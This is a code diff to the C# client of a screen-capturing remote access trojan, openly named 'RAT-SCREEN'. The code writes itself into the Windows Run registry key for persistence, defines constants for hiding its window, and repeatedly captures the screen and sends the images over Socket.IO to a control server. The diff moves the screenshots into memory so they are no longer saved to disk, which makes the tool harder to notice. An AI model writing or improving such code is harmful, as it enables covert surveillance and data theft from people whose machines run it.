@@ -37,7 +37,7 @@ namespace client
 
 		private static void SetStartup()
 		{
-			Microsoft.Win32.RegistryKey key = Microsoft.Win32.Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
+			RegistryKey key = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
 			key.SetValue("RAT-SCREEN", Application.ExecutablePath);
 		}
 
@@ -49,8 +49,6 @@ namespace client
 
 		const int SW_HIDE = 0;
 		const int SW_SHOW = 5;
-
-
 
 		private static async void ScreenshotExecutor()
 		{
@@ -65,10 +63,10 @@ namespace client
 
 		private static void SendScreen()
 		{
-			var pathScreen = CreateScreenshot();
-			var bytes = ConvertJPEGToBytes(pathScreen);
+			var (name, screen) = CreateScreenshot();
+			var bytes = ConvertJPEGToBytes(screen);
 
-			Send("screenshoot", bytes, pathScreen);
+			Send("screenshoot", bytes, name);
 		}
 
 		private static void Send(string eventName, object bytes, object name)
@@ -76,7 +74,7 @@ namespace client
 			_client.EmitAsync(eventName, bytes, name);
 		}
 
-		private static string CreateScreenshot()
+		private static (string, Bitmap) CreateScreenshot()
 		{
 			var date = DateTime.Now;
 
@@ -91,24 +89,20 @@ namespace client
 
 			captureGraphics.CopyFromScreen(captureRectangle.Left, captureRectangle.Top, 0, 0, captureRectangle.Size);
 
-			var path = $@"C:\Users\Mrrebrik\Desktop\Screen_{date.Day}_{date.Month}_{date.Year}_{date.Hour}_{date.Minute}_{date.Second}.jpg";
+			var name = $"Screen_{date.Day}_{date.Month}_{date.Year}_{date.Hour}_{date.Minute}_{date.Second}";
 
-			captureBitmap.Save(path, ImageFormat.Jpeg);
-
-			return path;
+			return (name, captureBitmap);
 		}
 
-		private static byte[] ConvertJPEGToBytes(string path)
+		private static byte[] ConvertJPEGToBytes(Bitmap screen)
 		{
-			Bitmap bmp = new Bitmap(path);
-
 			MemoryStream ms = new MemoryStream();
 
-			bmp.Save(ms, System.Drawing.Imaging.ImageFormat.Jpeg);
+			screen.Save(ms, ImageFormat.Jpeg);
 
 			byte[] bmpBytes = ms.GetBuffer();
 
-			bmp.Dispose();
+			screen.Dispose();
 			ms.Close();
 
 			return bmpBytes;
@@ -116,7 +110,7 @@ namespace client
 
 		private static void Connect()
 		{
-			_client = new SocketIOClient.SocketIO("http://localhost:3000");
+			_client = new SocketIO("http://localhost:3000");
 
 			_client.ConnectAsync();
 		}
